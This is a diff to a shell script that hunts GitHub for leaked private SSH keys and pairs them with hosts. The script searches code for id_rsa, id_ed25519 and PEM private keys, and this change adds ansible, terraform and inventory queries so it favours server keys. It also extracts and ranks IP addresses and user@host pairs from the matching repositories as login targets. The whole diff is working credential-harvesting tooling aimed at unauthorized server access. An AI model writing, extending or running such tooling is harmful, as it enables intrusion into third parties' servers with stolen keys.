@@ -52,6 +52,9 @@ IP_NOISE='^(1\.0\.0\.1|1\.1\.1\.1|4\.2\.1\.1|4\.2\.2\.[1-6]|4\.4\.4\.4|8\.8\.4\.
 # names BOTH the host and the login. That beats guessing users against an
 # arbitrary IP, so those pairs are emitted first and logged to pairs.txt.
 USER_AT_RE='[A-Za-z_][A-Za-z0-9_-]*@([0-9]{1,3}\.){3}[0-9]{1,3}'
+# awk sees these as ERE, where the backslashes are just noise (and warn)
+IP_DROP_AWK=$(printf '%s' "$IP_DROP" | tr -d '\\')
+IP_NOISE_AWK=$(printf '%s' "$IP_NOISE" | tr -d '\\')
 rank_ips() {
     grep -vE "$IP_DROP" | grep -vE "$IP_NOISE" | sort | uniq -c | sort -rn | awk '{print $2}'
 }
@@ -69,7 +72,7 @@ repo_hosts() {
         grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
         # precise pass: explicit user@host pairs, best signal in the repo
         grep -rshoE "$USER_AT_RE" "$d" 2>/dev/null | sort -u \
-            | awk -F@ -v drop="$IP_DROP" -v noise="$IP_NOISE" \
+            | awk -F@ -v drop="$IP_DROP_AWK" -v noise="$IP_NOISE_AWK" \
                   '{ if ($NF ~ drop || $NF ~ noise) next; print }' \
             | head -n "$HOSTS_PER_REPO" > "$WORK/last.userip" || true
         cat "$d/t1"
@@ -96,7 +99,11 @@ harvest() {
     # entire candidate pool, and only ~10% of urls are distinct repos. At
     # per_page=20 the pool is 60 urls (~6 repos) so HUNT_MAX_REPOS never even
     # binds; 100 is the API maximum and makes the pool ~300.
-    for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY'; do
+    # A key committed next to ansible/terraform/deploy files is far more likely
+    # to be a *server* key than a random id_rsa, so bias the search that way:
+    # half the queries are plain, half demand an infra marker as well.
+    for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY' \
+             'filename:id_rsa+ansible' 'filename:id_rsa+terraform' 'filename:.pem+inventory'; do
         api "https://api.github.com/search/code?q=$q&per_page=100" 2>/dev/null \
           | grep -oE '"html_url": *"[^"]+"' \
           | grep '/blob/' \
